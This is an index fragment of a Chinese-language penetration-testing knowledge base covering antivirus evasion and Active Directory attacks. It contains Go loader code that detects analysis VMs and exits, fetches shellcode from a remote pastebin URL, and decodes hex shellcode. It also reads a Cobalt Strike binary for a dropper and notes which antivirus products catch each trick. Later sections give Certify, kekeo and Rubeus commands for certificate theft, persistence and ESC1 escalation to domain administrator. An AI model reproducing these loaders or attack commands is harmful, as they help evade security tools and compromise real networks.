\u7528\u5b83\u548cXOR\u6253\u7ec4\u5408\u62f3\u6548\u679c\u5c06\u5c31\uff0c\u7528\u4e86\u65e0\u7a97\u542f\u52a8\u540e\u67097\u4e2a\u67e5\u51fa\u6765","title":"\u6c99\u76d2&amp;\u865a\u62df\u673a\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_24","text":"\u8fd9\u4e2a\u4f1a\u88abdefender\u62e6\uff0c\u4e0d\u5fc5\u8981\u7684\u8bdd\u4e0d\u7528\u8fd9\u4e2a func PathExists(path string) (bool, error) { //\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728 _, err := os.Stat(path) if err == nil { return true, nil } if os.IsNotExist(err) { return false, nil } return false, err } func fack(path string) { //\u5224\u65ad\u865a\u62df\u673a\u5173\u952e\u6587\u4ef6\u662f\u5426\u5b58\u5728 b, _ := PathExists(path) if b { fmt.Printf(\"\u5f53\u524d\u662f\u865a\u62df\u673a\u73af\u5883\uff0c\u522b\u5206\u6790\u4e86\uff0c\u54e5\u3002\") os.Exit(1) //\u5982\u679c\u662f\u865a\u62df\u673a\u5c31\u9000\u51fa\u5f53\u524d\u8fdb\u7a0b } } func check() { fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\Vmmouse.sys\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\vmtray.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VMToolsHook.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\vmmousever.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\vmhgfs.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\vmGuestLib.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxMouse.sys\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxGuest.sys\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxSF.sys\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxVideo.sys\") fack(\"C:\\\\windows\\\\System32\\\\vboxdisp.dll\") fack(\"C:\\\\windows\\\\System32\\\\vboxhook.dll\") fack(\"C:\\\\windows\\\\System32\\\\vboxoglerrorspu.dll\") fack(\"C:\\\\windows\\\\System32\\\\vboxoglpassthroughspu.dll\") fack(\"C:\\\\windows\\\\System32\\\\vboxservice.exe\") fack(\"C:\\\\windows\\\\System32\\\\vboxtray.exe\") fack(\"C:\\\\windows\\\\System32\\\\VBoxControl.exe\") }","title":"\u865a\u62df\u673a\uff1a\u654f\u611f\u6587\u4ef6\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_10","text":"Url,err:=url.Parse(\"https://pastebin.com/aa\") if err!=nil{ panic(\"error\") } client:=http.Client{} req,_:=http.NewRequest(\"GET\",Url.String(),nil) req.Header.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\") req.Header.Add(\"Cookie\",\"SUB=_2 SUBP=00\") resp,_:=client.Do(req) body,_:=ioutil.ReadAll(resp.Body) //string\u5f62\u5f0f\u83b7\u53d6\u4e86\u9875\u9762\u5185\u5bb9,\u4ee5\u4e0a\u4ee3\u7801\u4e3a\u4e3b\u4f53\u90e8\u5206 //\u901a\u8fc7\u4e00\u7cfb\u5217\u6b63\u5219\u5339\u914d,\u5b57\u7b26\u4e32\u622a\u53d6\u7b49\u65b9\u6cd5\u4ece\u9875\u9762\u4e2d\u5f97\u5230shellcode(\u9875\u9762\u4e2d\u6211\u7684shellcode\u662f\u8fd9\u6837\u7684rngrngfc,48,....,aalgdlgd) re:=regexp.MustCompile(`rngrng.*lgdlgd`) match:=re.FindString(string(body)) match=match[6:len(match)-6] return match \u4f46\u662f\u62d6\u4e0b\u6765\u7684shellcode\u662fstring\u683c\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u628a\u4ed6\u8f6c\u4e3a[]byte func aa(encodes string) []byte{ var xor_shellcode []byte spi:=\",\" enc:=strings.Split(encodes,spi) for i,_ :=range enc{ tmps,_:=hex.DecodeString(enc[i]) if(len(tmps)>0) { xor_shellcode = append(xor_shellcode, tmps[0]) } } return xor_shellcode } \u8fdc\u7a0b+XOR+\u6c99\u7bb1 \u53cd\u800c\u88ab\u6740\u7684\u66f4\u591a...\u770b\u6765\u8fd9\u4e2aHTTP\u51fd\u6570\u88ab\u6293\u7684\u5f88\u7d27\uff0c\u8fd8\u88ab360\u6740\u51fa\u6765\u4e86","title":"\u8fdc\u7a0b\u8bfbshellcode"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_11","text":"var sc []byte bytes,_:=ioutil.ReadFile(\"C:\\\\Users\\\\xx\\\\Desktop\\\\sc.txt\") tmp:=strings.Split(string(bytes),\",\") for i,_ :=range tmp{ tmps,_:=hex.DecodeString(tmp[i]) if(len(tmps)>0) { sc = append(sc, tmps[0]) } } \u53ef\u4ee5","title":"\u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684SHELLCODE"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_25","text":"\u5728\u6211\u4eec\u6728\u9a6c\u8fd0\u884c\u65f6\u53ef\u4ee5\u91ca\u653e\u4e00\u4e2a\u6b63\u5e38\u6587\u4ef6\u5e76\u8fd0\u884c\uff0c\u8fbe\u5230DLL\u52ab\u6301\u6216\u8005\u8ff7\u60d1\u89c6\u542c\u7684\u4f5c\u7528\u3002 \u83b7\u53d6\u6587\u4ef6\u5185\u5bb9 file,_:=os.Open(\"E:\\\\tools\\\\shell\\\\cobaltstrike4.3\\\\cobaltstrike.exe\") fi,_:=file.Stat() size:=fi.Size() data := make([]byte, size) file.Read(data) for _,i:=range data{ fmt.Print(strconv.Itoa(int(i))+\",\") } \\","title":"\u6587\u4ef6\u91ca\u653e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","text":"\u5185\u7f51\u6e17\u900f Windows\u5185\u7f51\u57fa\u7840\u6982\u89c8 ARP\u6b3a\u9a97\\&DNS\u6b3a\u9a97\\&mac\u6cdb\u6d2a\u653b\u51fb Windows\u540d\u79f0\u89e3\u6790\u4e0e\u76f8\u5e94\u653b\u51fb\u65b9\u6cd5 windows\u5185\u7f51\u6e17\u900f\u5e38\u7528\u547d\u4ee4\u603b\u6c47 \u6a2a\u5411\u79fb\u52a8\u65b9\u6cd5\u603b\u6c47 NTLM Relay\u53ca\u76f8\u5173\u539f\u7406 ADCS\u5b89\u5168\u95ee\u9898 \u5229\u7528acl\u8fdb\u884c\u6a2a\u5411 \u57df\u6743\u9650\u7ef4\u6301\u901a\u7528\u65b9\u6cd5\u603b\u6c47 \u57df\u7ba1\u63d0\u6743\u4e00\u628a\u68ad","title":"\u5185\u7f51\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/#_1","text":"Windows\u5185\u7f51\u57fa\u7840\u6982\u89c8 ARP\u6b3a\u9a97\\&DNS\u6b3a\u9a97\\&mac\u6cdb\u6d2a\u653b\u51fb Windows\u540d\u79f0\u89e3\u6790\u4e0e\u76f8\u5e94\u653b\u51fb\u65b9\u6cd5 windows\u5185\u7f51\u6e17\u900f\u5e38\u7528\u547d\u4ee4\u603b\u6c47 \u6a2a\u5411\u79fb\u52a8\u65b9\u6cd5\u603b\u6c47 NTLM Relay\u53ca\u76f8\u5173\u539f\u7406 ADCS\u5b89\u5168\u95ee\u9898 \u5229\u7528acl\u8fdb\u884c\u6a2a\u5411 \u57df\u6743\u9650\u7ef4\u6301\u901a\u7528\u65b9\u6cd5\u603b\u6c47 \u57df\u7ba1\u63d0\u6743\u4e00\u628a\u68ad","title":"\u5185\u7f51\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","text":"ADCS\u5b89\u5168\u95ee\u9898 \u76ee\u5f55 \u67e5\u770b\u8bc1\u4e66\u6a21\u7248 \u8bc1\u4e66\u8eab\u4efd\u9a8c\u8bc1 \u679a\u4e3eca \u653b\u51fb \u8bc1\u4e66\u7a83\u53d6 NTLM Credential Theft via PKINIT \u2013 THEFT5 \u6743\u9650\u7ef4\u6301 Active User Credential Theft via Certificates \u2013 PERSIST1 Machine Persistence via Certificates - PERSIST2 \u57df\u6743\u9650\u63d0\u5347 Misconfigured Certificate Templates - ESC1 Misconfigured Certificate Templates - ESC2 Misconfigured Enrollment Agent Templates - ESC3 Vulnerable Certificate Template Access Control - ESC4 CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6 Vulnerable Certificate Authority Access Control - ESC7 \u57df\u6743\u9650\u7ef4\u6301 Active Directory Certificate Services \u8bc1\u4e66\u670d\u52a1\u3002ADCS \u5e76\u4e0d\u662f\u9ed8\u8ba4\u5b89\u88c5\u4f46\u5728\u5927\u578b\u4f01\u4e1a\u57df\u4e2d\u901a\u5e38\u88ab\u5e7f\u6cdb\u90e8\u7f72 adcs\u5927\u91cf\u653b\u51fb\u9762\u5b58\u5728\u4e8e\u8bc1\u4e66\u6a21\u7248\u4e2d\uff0c\u5b58\u50a8\u4e3a CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=,DC= \uff0c \u67e5\u770b\u8bc1\u4e66\u6a21\u7248 \u67e5\u770b\u67d0\u4e2a\u7528\u6237\u6216\u7528\u6237\u7ec4\u5bf9\u67d0\u4e2a\u8bc1\u4e66\u6a21\u7248\u62e5\u6709\u7684\u6743\u9650 Import-Module ActiveDirectory cd AD: $Acl = Get-Acl 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=pentest,DC=com' $Acl.Access.Count $Acl.Access | where IdentityReference -match 'Domain Users' \u6216\u8005 certtmpl.msc \uff0c\u53f3\u952e\u70b9\u51fb \u201c\u6a21\u677f\u201d\uff0c\u9009\u62e9 \u201c\u5c5e\u6027\u201d\uff0c\u7136\u540e\u67e5\u770b \u201c \u5b89\u5168\u201d \u9009\u9879\u5361 \u6216\u8005certsrv.msc\uff0c\u53f3\u952e\u5355\u51fb\u9009\u4e2d\u7684 CA\uff0c\u9009\u62e9 \u201c\u5c5e\u6027\u201d\uff0c\u7136\u540e\u67e5\u770b \u201c \u5b89\u5168\u201d \u9009\u9879\u5361 \u8bc1\u4e66\u8eab\u4efd\u9a8c\u8bc1 AD \u9ed8\u8ba4\u652f\u6301\u4e24\u79cd\u534f\u8bae\u7684\u8bc1\u4e66\u8eab\u4efd\u9a8c\u8bc1\uff1aKerberos \u534f\u8bae\u548c\u5b89\u5168\u4fe1\u9053\uff08Secure Channel\uff0cSchannel\uff09\u3002 PKINT\uff08Public Key Cryptography for Initial Authentication \uff0c\u201c\u7528\u4e8e\u521d\u59cb\u8ba4\u8bc1\u7684\u516c\u94a5\u5bc6\u7801\u4f53\u5236\u201d\uff09\u88ab\u7528\u4e8ekerberos\u534f\u8bae\u4e2d\u5b9a\u4e49\u8bc1\u4e66\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u3002 Secure Channel\uff08Schannel\uff09\u662f Windows \u5728\u5efa\u7acb TLS/SSL \u8fde\u63a5\u65f6\u5229\u7528\u7684 SSP\u3002Schannel \u652f\u6301\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1\uff08\u4ee5\u53ca\u8bb8\u591a\u5176\u4ed6\u529f\u80fd\uff09\uff0c\u4f7f\u8fdc\u7a0b\u670d\u52a1\u5668\u80fd\u591f\u9a8c\u8bc1\u8fde\u63a5\u7528\u6237\u7684\u8eab\u4efd\u3002\u5b83\u4f7f\u7528 PKI \u5b8c\u6210\u6b64\u64cd\u4f5c\uff0c\u8bc1\u4e66\u662f\u4e3b\u8981\u51ed\u636e\u3002\u5728 TLS \u63e1\u624b\u671f\u95f4\uff0c\u670d\u52a1\u5668\u8981\u6c42\u5ba2\u6237\u7aef\u8bf7\u63d0\u4f9b\u8bc1\u4e66\u4ee5\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5ba2\u6237\u7aef\u5148\u524d\u5df2\u4ece\u670d\u52a1\u5668\u4fe1\u4efb\u7684 CA \u9881\u53d1\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1\u8bc1\u4e66\uff0c\u7136\u540e\u5c06\u5176\u8bc1\u4e66\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u7136\u540e\uff0c\u670d\u52a1\u5668\u9a8c\u8bc1\u8bc1\u4e66\u662f\u5426\u6b63\u786e\uff0c\u5e76\u5728\u4e00\u5207\u6b63\u5e38\u7684\u60c5\u51b5\u4e0b\u6388\u4e88\u7528\u6237\u8bbf\u95ee\u6743\u9650\u3002 \u679a\u4e3eca \u5982\u679c\u60f3\u8981\u679a\u4e3e\u4f01\u4e1a CA \u53ca\u5176\u8bbe\u7f6e\uff0c\u53ef\u4ee5\u4ee5 CN=Configuration,DC=<DOMAIN>,DC=<COM> \u4e3a BaseDN\uff0c\u4ee5 (objectCategory=pKIEnrollmentService) \u4e3a\u8fc7\u6ee4\u5668\u67e5\u8be2 LDAP\u3002\u7ed3\u679c\u5c06\u8bc6\u522b CA \u670d\u52a1\u5668\u7684 DNS \u4e3b\u673a\u540d\u3001CA \u540d\u79f0\u672c\u8eab\u3001\u8bc1\u4e66\u5f00\u59cb\u548c\u7ed3\u675f\u65e5\u671f\u3001\u5404\u79cd\u6807\u5fd7\u3001\u5df2\u53d1\u5e03\u7684\u8bc1\u4e66\u6a21\u677f\u7b49\u5404\u79cd\u5c5e\u6027\u4fe1\u606f\u3002 $baseDN = \"CN=Configuration,DC=<DOMAIN>,DC=<COM>\" $filter = \"(objectCategory=pKIEnrollmentService)\" Get-ADObject -SearchBase $baseDN -LDAPFilter $filter Certify \u53ef\u4ee5\u679a\u4e3e\u6709\u5173 AD CS \u73af\u5883\u7684\u6709\u7528\u914d\u7f6e\u548c\u57fa\u7840\u7ed3\u6784\u4fe1\u606f\uff0c\u4f7f\u7528\u5176 cas \u547d\u4ee4\u53ef\u4ee5\u679a\u4e3e\u53d7\u4fe1\u4efb\u7684\u6839 CA \u8bc1\u4e66\u3001\u7531 NTAuthCertificates \u5bf9\u8c61\u5b9a\u4e49\u7684\u8bc1\u4e66\u4ee5\u53ca\u6709\u5173\u4f01\u4e1a CA \u7684\u5404\u79cd\u4fe1\u606f\uff1a https://github.com/GhostPack/Certify Certify.exe cas \u8981\u83b7\u53d6\u6709\u5173\u6bcf\u4e2a\u53ef\u7528\u8bc1\u4e66\u6a21\u677f\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u53ef\u4ee5\u4f7f\u7528 certutil -v -dstemplate \u547d\u4ee4 \u653b\u51fb \u8bc1\u4e66\u7a83\u53d6 NTLM Credential Theft via PKINIT \u2013 THEFT5 \u5f53\u4f7f\u7528\u8bc1\u4e66\u8fdb\u884c Kerberos PKINIT \u8eab\u4efd\u9a8c\u8bc1\u7684\u65f6\u5019\uff0c\u8fd4\u56de\u7684\u7968\u636e\u7684 PAC \u5305\u91cc\u9762\u5305\u542b\u7528\u6237\u7684 NTLM \u51ed\u636e\u3002\u83b7\u53d6\u8fd9\u4e2a NTLM \u51ed\u636e\u6d89\u53ca\u89e3\u5bc6 PAC_CREDENTIAL_DATA \u7ed3\u6784\uff0cmimikatz\u548ckekeo\u5b9e\u73b0\u4e86\u8be5\u70b9\u3002 kekeo.exe \"tgt::pac /caname:pentest-DC01-CA /subject:Marcus /castore:current_user /domain:pentest.com\" exit \u5373\u4f7f\u7528\u6237\u5c06\u5bc6\u7801\u6539\u4e86\uff0c\u901a\u8fc7\u8bc1\u4e66\u4e5f\u968f\u65f6\u90fd\u53ef\u4ee5\u83b7\u53d6 NTLM \u6743\u9650\u7ef4\u6301 Active User Credential Theft via Certificates \u2013 PERSIST1 \u5982\u679c\u6709\u76f8\u5e94\u7684\u8bc1\u4e66\u6a21\u7248\uff0c\u4e14\u5df2\u77e5\u5f53\u524d\u7528\u6237\u5bc6\u7801\uff0c\u5219\u53ef\u4ee5\u7528\u8bc1\u4e66\u7533\u8bf7tgt\u6765\u8fbe\u5230\u6743\u9650\u7ef4\u6301\uff0c\u5373\u4f7f\u7528\u6237\u91cd\u7f6e\u5bc6\u7801\uff0c\u8be5tgt\u4e5f\u4f9d\u65e7\u6709\u6548\uff0c\u6b64\u65b9\u6cd5\u4e0d\u4f1a\u7ecf\u8fc7lsass\u53ef\u4ee5\u89c4\u907f\u4e00\u4e9bedr\u68c0\u6d4b\u3002 \u6240\u4f7f\u7528\u7684\u8bc1\u4e66\u6a21\u677f\u9700\u8981\u5177\u6709\u4ee5\u4e0b\u5c5e\u6027\uff1a \u8be5\u8bc1\u4e66\u6a21\u677f\u516c\u5f00\u6ce8\u518c\u3002 \u5141\u8bb8\u57df\u7528\u6237\uff08\u6216\u7528\u6237\u6240\u5c5e\u7684\u7ec4\uff09\u8fdb\u884c\u6ce8\u518c\u3002 \u81f3\u5c11\u5177\u6709\u4ee5\u4e0b\u4efb\u4f55\u53ef\u542f\u7528\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\uff1a Smart Card Logon (1.3.6.1.4.1.311.20.2.2) Client Authentication (1.3.6.1.5.5.7.3.2) \u25cb PKINIT Client Authentication (1.3.6.1.5.2.3.4) Any Purpose EKU (2.5.29.37.0) No EKU set. i.e., this is a (subordinate) CA certificate. \u4e0d\u9700\u8981\u8bc1\u4e66\u7ba1\u7406\u5458\u6279\u51c6\u6216 \u201c\u6388\u6743\u7b7e\u540d\u201d \u7b7e\u53d1\u8981\u6c42\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u6709\u4e00\u4e2a\u5df2\u53d1\u5e03\u7684\u6a21\u677f\u5141\u8bb8\u8fd9\u6837\u505a\uff0c\u5373 User \u6a21\u677f\u3002\u4f46\u662f\uff0c\u867d\u7136\u6b64\u6a21\u677f\u662f AD CS \u7684\u9ed8\u8ba4\u6a21\u677f\uff0c\u4f46\u67d0\u4e9b\u73af\u5883\u53ef\u80fd\u4f1a\u7981\u7528\u5b83\u3002 \u67e5\u627e\u7b26\u5408\u4e0a\u8ff0\u6761\u4ef6\u7684\u6a21\u7248 Certify.exe find /clientauth \u7533\u8bf7\u8bc1\u4e66\uff0c\u4ee5User\u6a21\u7248\u4e3a\u4f8b\uff08\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8981\u60f3\u6210\u529f\u4f7f\u7528 Certify \u7684 request \u547d\u4ee4\uff0c\u9700\u8981\u5c06 Certify \u9879\u76ee\u4e2d\u751f\u4ea7\u7684 DLL \u4f9d\u8d56 Interop.CERTENROLLLib.dll \u590d\u5236\u5230 Certify.exe \u7684\u76f8\u540c\u76ee\u5f55\u4e0b\u3002\uff09 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:User \u6210\u529f\u6267\u884c\u540e\uff0c\u5c06\u8f93\u51fa\u8bc1\u4e66 + \u79c1\u94a5\u7684 .pem \u683c\u5f0f\u7684\u6587\u672c\u5757\uff0c\u9700\u7528openssl\u547d\u4ee4\u8f6c\u6362\u4e3a.pfx\u683c\u5f0f\uff0c\u624d\u80fd\u7ed9rubeus\u7528\u3002 \u6267\u884c\u8fd9\u4e2a\u6307\u4ee4\u540e\u4f1a\u63d0\u793a\u60a8\u8f93\u5165\u5bc6\u7801\uff0c\u4ee5\u4fdd\u62a4\u751f\u6210\u7684 .pfx \u6587\u4ef6\u3002 openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx \u901a\u8fc7rubeus\u7533\u8bf7tgt\u5e76\u6ce8\u5165\u5185\u5b58 Rubeus.exe asktgt /user:Marcus /certificate:C:\\Users\\Marcus\\cert.pfx /password:Passw0rd /ptt Machine Persistence via Certificates - PERSIST2 \u5982\u679c\u653b\u51fb\u8005\u63d0\u5347\u4e86\u6743\u9650\u5230system\uff0c\u53ef\u4ee5\u901a\u8fc7\u9ed8\u8ba4\u7684 Machine \u6a21\u677f\u4e3a\u5f53\u524d\u673a\u5668\u8d26\u6237\u6ce8\u518c\u8bc1\u4e66,\u5e76\u83b7\u53d6tgt Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:Machine /machine \u540e\u7eed\u64cd\u4f5c\u4e0e\u4e0a\u4e00\u5c0f\u8282\u4e00\u81f4\uff0c\u7528kekeo\u6ce8\u5165tgt\u5230\u5185\u5b58\u3002 \u57df\u6743\u9650\u63d0\u5347 Misconfigured Certificate Templates - ESC1 \u8bc1\u4e66\u6a21\u7248\u6709\u4e00\u7ec4\u7279\u5b9a\u7684\u8bbe\u7f6e\uff0c\u4f7f\u5b83\u4eec\u6781\u6613\u88ab\u653b\u51fb\u8005\u5229\u7528\uff0c\u4ee5\u5b9e\u73b0\u57df\u6743\u9650\u63d0\u5347\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ecb\u7ecd\u7b2c\u4e00\u79cd\u914d\u7f6e\u60c5\u51b5\uff08ESC1\uff09\uff1a \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u7279\u6743\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002 CA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6\u88ab\u7981\u7528\u3002 \u65e0\u9700\u6388\u6743\u7b7e\u540d\u3002 \u8fc7\u4e8e\u5bbd\u677e\u7684\u8bc1\u4e66\u6a21\u677f\u5b89\u5168\u63cf\u8ff0\u7b26\u4f1a\u5411\u4f4e\u7279\u6743\u7528\u6237\u6388\u4e88\u8bc1\u4e66\u6ce8\u518c\u6743\u9650\u3002 \u8bc1\u4e66\u6a21\u677f\u5b9a\u4e49\u4e86\u542f\u7528\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\u3002 \u8bc1\u4e66\u6a21\u677f\u5141\u8bb8\u8bf7\u6c42\u8005\u5728 CSR \u4e2d\u6307\u5b9a subjectAltName\u3002 \u6ce8\u610f\u6700\u540e\u4e00\u70b9\uff0c\u8fd9\u4e2a\u610f\u601d\u662f\u5728\u901a\u8fc7\u8bc1\u4e66\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u53ef\u4ee5\u6307\u5b9a\u8bf7\u6c42\u8005\u7684\u8eab\u4efd\u4e3a\u4efb\u4f55\u4eba\uff08\u4f8b\u5982\u57df\u7ba1\uff09\u3002 \u8bc1\u4e66\u6a21\u677f\u5728\u5176 AD \u5bf9\u8c61\u7684 mspki-certificate-name-flag \u5c5e\u6027\u4e2d\u6307\u5b9a\u8bf7\u6c42\u8005\u662f\u5426\u53ef\u4ee5\u5728\u5176\u4e2d\u6307\u5b9a SAN\u3002 mspki-certificate-name-flag \u5c5e\u6027\u662f\u4f4d\u63a9\u7801\uff0c\u5982\u679c\u5b58\u5728 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6807\u5fd7\uff0c\u5219\u8bf7\u6c42\u8005\u53ef\u4ee5\u6307\u5b9a SAN\u3002\u5728\u8bc1\u4e66\u6a21\u677f\u63a7\u5236\u53f0 MMC \u7ba1\u7406\u5355\u5143\u4e2d\uff0c\u6b64\u503c\u5728\u6a21\u677f\u7684 \u201c\u5c5e\u6027\u201d \u7684 \u201c\u4f7f\u7528\u8005\u540d\u79f0\u201d \u9009\u9879\u5361\u4e2d\u8fdb\u884c\u8bbe\u7f6e\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u52fe\u9009 \u201c\u5728\u8bf7\u6c42\u4e2d\u63d0\u4f9b(S)\u201d \u5373\u53ef\u3002 \u4e0a\u8ff0\u8fd9\u4e9b\u914d\u7f6e\u5141\u8bb8\u4f4e\u6743\u9650\u7528\u6237\u4f7f\u7528\u4efb\u610f\u7684 SAN \u8bf7\u6c42\u8bc1\u4e66\uff0c\u5bfc\u81f4\u4f4e\u6743\u9650\u7528\u6237\u80fd\u591f\u901a\u8fc7 Kerberos \u6216 SChannel \u4ee5\u57df\u4e2d\u7684\u4efb\u4f55\u4e3b\u4f53\u8eab\u4efd\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u679a\u4e3e\u5b58\u5728\u5371\u9669\u7684\u8bc1\u4e66\u6a21\u7248 Certify.exe find /vulnerable \u5982\u4e0a\u56fe\u6240\u793a\uff0c\u8bc1\u4e66\u6a21\u677f VulnTemplate \u5728 msPKI-Certificate-Name-Flag \u5c5e\u6027\u4e2d\u542f\u7528\u4e86 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6807\u5fd7 \u5e76\u4e14\u5177\u6709\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\uff08Extended Key Usage,\u6269\u5c55\u5bc6\u94a5\u7528\u9014\uff09\uff0cpkiextendedkeyuseage\u5b58\u5728\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1 \u5e76\u6388\u4e88\u6240\u6709\u57df\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002(enrollment rights\u5b58\u5728 domain users\uff09 \u901a\u8fc7certify\u8bf7\u6c42tgt Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:VulnTemplate /altname:PENTEST\\Administrator \u8f6c\u4e3a.pfx\u540e\u7ed9rubeus\u5229\u7528\u3002 Rubeus.exe asktgt /user:Administrator /certificate:C:\\Users\\Marcus\\cert.pfx /password:Passw0rd /ptt Misconfigured Certificate Templates - ESC2 \u662fesc1\u7684\u53d8\u4f53 \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u7279\u6743\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 CA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6\u88ab\u7981\u7528\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u65e0\u9700\u6388\u6743\u7b7e\u540d\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u8fc7\u4e8e\u5bbd\u677e\u7684\u8bc1\u4e66\u6a21\u677f\u5b89\u5168\u63cf\u8ff0\u7b26\u4f1a\u5411\u4f4e\u7279\u6743\u7528\u6237\u6388\u4e88\u8bc1\u4e66\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u8bc1\u4e66\u6a21\u677f\u5b9a\u4e49\u4e86 Any Purpose \u7c7b\u578b\u7684 EKU \u6216 SubCA \u7c7b\u578b\u7684 EKU\u3002\u524d\u8005 Any Purpose \u6307\u8bc1\u4e66\u53ef\u4ee5\u7528\u4e8e\u4efb\u4f55\u76ee\u7684\uff0c\u540e\u8005 SubCA 